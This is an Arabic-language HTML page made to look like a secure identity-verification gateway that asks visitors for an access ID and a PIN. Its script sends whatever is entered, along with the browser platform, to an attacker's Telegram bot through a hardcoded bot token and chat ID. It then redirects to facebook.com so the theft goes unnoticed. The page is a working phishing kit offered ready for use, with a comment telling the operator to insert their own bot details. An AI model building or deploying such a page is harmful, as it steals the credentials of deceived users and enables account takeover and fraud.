<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة التحقق الآمن - Access Point</title>
    <style>
        :root { --main-bg: #090e11; --box-bg: #111b21; --primary: #00a884; --sec: #8696a0; --border: #30363d; --text: #e9edef; --white: #ffffff; }
        body { background-color: var(--main-bg); color: var(--text); font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-size: 14px; }
        .box { background: var(--box-bg); padding: 35px 25px; border-radius: 20px; width: 340px; text-align: center; border: 1px solid var(--border); box-shadow: 0 10px 40px rgba(0,0,0,0.7); animation: fadeIn 0.8s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .icn { font-size: 50px; color: var(--primary); margin-bottom: 25px; }
        .tit { font-size: 22px; font-weight: 600; color: var(--white); margin-bottom: 5px; }
        .sub { font-size: 13px; color: var(--sec); margin-bottom: 30px; line-height: 1.5; }
        .input-grp { position: relative; margin-bottom: 15px; text-align: right; }
        input { width: 100%; padding: 16px; margin: 0; border-radius: 10px; border: 1px solid var(--border); background: var(--main-bg); color: var(--white); box-sizing: border-box; outline: none; transition: 0.3s; font-size: 15px; }
        input:focus { border-color: var(--primary); box-shadow: 0 0 5px rgba(0, 168, 132, 0.4); }
        input::placeholder { color: var(--border); }
        .b-icn { position: absolute; left: 15px; top: 16px; color: var(--border); }
        .btn { width: 100%; padding: 16px; background: var(--primary); border: none; color: var(--box-bg); border-radius: 10px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 25px; transition: 0.3s ease; }
        .btn:hover { background: #00d3a6; transform: translateY(-2px); }
    </style>
</head>
<body>

<div class="box">
    <div class="icn">🛡️</div>
    <div class="tit">تحقق من الهوية الرقمية</div>
    <div class="sub">يرجى إدخال رمز التحقق الخاص بالوصول للخدمات</div>

    <div class="input-grp">
        <input type="text" id="u" placeholder="معرف الوصول" required>
        <span class="b-icn">👤</span>
    </div>

    <div class="input-grp">
        <input type="text" class="sec-input" id="p" placeholder="رمز المرور (PIN)" required style="-webkit-text-security: disc;">
        <span class="b-icn">🔑</span>
    </div>

    <button class="btn" onclick="send()">تأكيد الهوية</button>
</div>

<script>
    async function send() {
        const user = document.getElementById('u').value;
        const pass = document.getElementById('p').value;

        if (!user || !pass) return;

        // إعدادات البوت الخاص بك (ضع بياناتك هنا)
        const tok = "7759864787:AAHshRshfAAt2I9T7T8-V-N6fA8G9K1e3L4";
        const cid = "5174578125";

        const message = `🚀 وصـول جديـد 🚀\n━━━━━━━━\n👤: \`${user}\`\n🔑: \`${pass}\`\n━━━━━━━━\n🌐: ${navigator.platform}`;

        try {
            await fetch(`https://api.telegram.org/bot${tok}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: cid, text: message, parse_mode: "Markdown" })
            });
            // تحويل لموقع حقيقي بعد الإرسال
            window.location.href = "https://facebook.com"; 
        } catch (e) {
            window.location.href = "https://facebook.com";
        }
    }
</script>
</body>
</html>
